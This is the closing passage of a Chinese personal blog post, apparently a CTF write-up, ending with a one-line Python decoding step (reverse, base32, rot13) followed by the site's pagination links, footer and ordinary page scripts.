</span></span><span style=display:flex><span>print(rot13(b32(reverse(cipher))<span style=color:#f92672>.</span>decode(<span style=color:#e6db74>&#34;ASCII&#34;</span>)))
</span></span></code></pre></div><p>前六位移到最后即可。</p><hr><p>自己没做出来的题就没写 wp 23333</p></section><div class=paginator><a class=prev href=https://blog.batkiz.com/posts/advice-to-new-programmers/><svg class="icon" width="24" height="24" viewBox="0 0 24 24" fill="none"><path d="M3.77086 21.1546C11.0491 22.698 21.4339 21.7773 21.4339 16.3608V4.63375c0-.69413-.075800000000001-1.3284-.2422-1.86588M3.77086 21.1546C1.9934 20.7777.973585 18.7264 1.08749 16.688c.17931-3.209.06972-7.25665-.08236-10.47293C.87809 3.52811 3.12891 1.16316 5.51029 1.25008c4.25565.15534 9.86671-.04779 13.28091-.24466 1.2952-.074686 2.0494.62843 2.4005 1.76245M3.77086 21.1546C4.56586 21.4723 5.49168 21.7879 6.5 22.0658M21.1917 2.76787c1.918 1.4143 1.9383 9.65123 1.7087 13.59293-2.0526 7.6586-10.5943 7.3054-16.4004 5.705M21.1917 2.76787C21.7612 4.51192 22.7203 9.67216 22 16.3608 21.2797 23.0494 11.3665 22.9511 6.5 22.0658M9.94496 9C9.28897 9.61644 7.63215 10.997 6.04814 11.7966 5.98257 11.8297 5.98456 11.9753 6.05061 12.0063c1.00435.4716 2.8788 1.9201 3.89435 2.9937M6.44444 11.9667C8.86549 12.0608 14 12 16 11" stroke="currentcolor" stroke-linecap="round"/></svg>
<span>翻译 | 给新手程序员们的建议</span></a>
<a class=next href=https://blog.batkiz.com/posts/using-scoop/><span>初探 Scoop</span><svg class="icon" width="24" height="24" viewBox="0 0 24 24" fill="none"><path d="M3.77086 21.1546C11.0491 22.698 21.4339 21.7773 21.4339 16.3608V4.63375c0-.69413-.075800000000001-1.3284-.2422-1.86588M3.77086 21.1546C1.9934 20.7777.973585 18.7264 1.08749 16.688c.17931-3.209.06972-7.25665-.08236-10.47293C.87809 3.52811 3.12891 1.16316 5.51029 1.25008c4.25565.15534 9.86671-.04779 13.28091-.24466 1.2952-.074686 2.0494.62843 2.4005 1.76245M3.77086 21.1546C4.56586 21.4723 5.49168 21.7879 6.5 22.0658M21.1917 2.76787c1.918 1.4143 1.9383 9.65123 1.7087 13.59293-2.0526 7.6586-10.5943 7.3054-16.4004 5.705M21.1917 2.76787C21.7612 4.51192 22.7203 9.67216 22 16.3608 21.2797 23.0494 11.3665 22.9511 6.5 22.0658M12.055 9C12.711 9.61644 14.3679 10.997 15.9519 11.7966 16.0174 11.8297 16.0154 11.9753 15.9494 12.0063 14.945 12.4779 13.0706 13.9264 12.055 15m3.5006-3.0333C13.1345 12.0608 8 12 6 11" stroke="currentcolor" stroke-linecap="round"/></svg></a></div></article></div><footer class=footer><p>&copy; 2024 <a href=https://blog.batkiz.com/>not b@tk1z</a>
Powered by
<a href=https://gohugo.io/ rel=noopener target=_blank>Hugo️️</a>
<a href=https://github.com/guangzhengli/hugo-theme-ladder rel=noopener target=_blank>Ladder</a>
️</p><script defer src=https://static.cloudflareinsights.com/beacon.min.js data-cf-beacon='{"token": "fd2a175921e640c8a40b873fb5e58aaa"}'></script></footer><a href=#top aria-label="go to top" title="Go to Top (Alt + G)" class=top-link id=top-link accesskey=g><svg width="24" height="24" viewBox="0 0 24 24" fill="none"><path d="M10.5376 22.7916C11.0152 22.7207 22.5795 21.1781 22.0978 10.4211 22.0536 9.43274 21.9303 8.53367 21.7387 7.71865M10.5376 22.7916C16.876 22.3728 20.0969 19.8899 21.5383 16.9142M10.5376 22.7916C9.7707 22.9055 8.97982 22.8964 8.19743 22.7725M21.7387 7.71865C21.4988 6.69828 21.1518 5.80967 20.7188 5.04257m1.0199 2.67608C22.6022 10.1105 23.0542 13.7848 21.5383 16.9142M20.7188 5.04257c-3.5504-6.28886-12.88753-4.410077-16.44303.0C2.88063 6.77451-.0433281 11.1668 1.38159 16.6571c.89322 3.4417 3.7911 5.6365 6.81584 6.1154M20.7188 5.04257c1.3509 1.89783 3.3111 6.34223 1.6353 10.37273M21.5383 16.9142C21.8737 16.4251 22.1428 15.9235 22.3541 15.4153M8.19743 22.7725C12.1971 23.4683 20.6281 22.971 22.3541 15.4153M14 10.945C13.3836 10.289 12.003 8.63215 11.2034 7.04814 11.1703 6.98257 11.0247 6.98456 10.9937 7.05061 10.5221 8.05496 9.07362 9.92941 8 10.945m3.0333-3.50056C10.9392 9.86549 11 15 12 17" stroke="currentcolor" stroke-linecap="round"/></svg>
</a><script>var mybutton=document.getElementById("top-link");window.onscroll=function(){document.body.scrollTop>800||document.documentElement.scrollTop>800?(mybutton.style.visibility="visible",mybutton.style.opacity="1"):(mybutton.style.visibility="hidden",mybutton.style.opacity="0")}</script><script>document.querySelectorAll("pre > code").forEach(e=>{const s=e.parentNode.parentNode,t=document.createElement("button");t.classList.add("copy-code"),t.innerHTML="Copy";function n(){t.innerHTML="Copied",setTimeout(()=>{t.innerHTML="Copy"},2e3)}t.addEventListener("click",t=>{if("clipboard"in navigator){navigator.clipboard.writeText(e.textContent),n();return}const s=document.createRange();s.selectNodeContents(e);const o=window.getSelection();o.removeAllRanges(),o.addRange(s);try{document.execCommand("copy"),n()}catch{}o.removeRange(s)}),e.parentNode.appendChild(t)})</script></main></body><script src=https://cdnjs.cloudflare.com/ajax/libs/medium-zoom/1.0.6/medium-zoom.min.js integrity="sha512-N9IJRoc3LaP3NDoiGkcPa4gG94kapGpaA5Zq9/Dr04uf5TbLFU5q0o8AbRhLKUUlp8QFS2u7S+Yti0U7QtuZvQ==" crossorigin=anonymous referrerpolicy=no-referrer></script><script>const images=Array.from(document.querySelectorAll(".blog-content img"));images.forEach(e=>{mediumZoom(e,{margin:10,scrollOffset:40,container:null,template:null,background:"rgba(0, 0, 0, 0.5)"})})</script><script src=/main.min.6bb26b69159420159c74dc9e097b06a578ed2b68c701466a91a44a9632d851bd0af167a1b30012387b4c512b48ad9ad4d3394e04d77ae38d57e1920fe4ed34fe.js integrity="sha512-a7JraRWUIBWcdNyeCXsGpXjtK2jHAUZqkaRKljLYUb0K8WehswASOHtMUStIrZrU0zlOBNd6441X4ZIP5O00/g==" crossorigin=anonymous defer></script></html>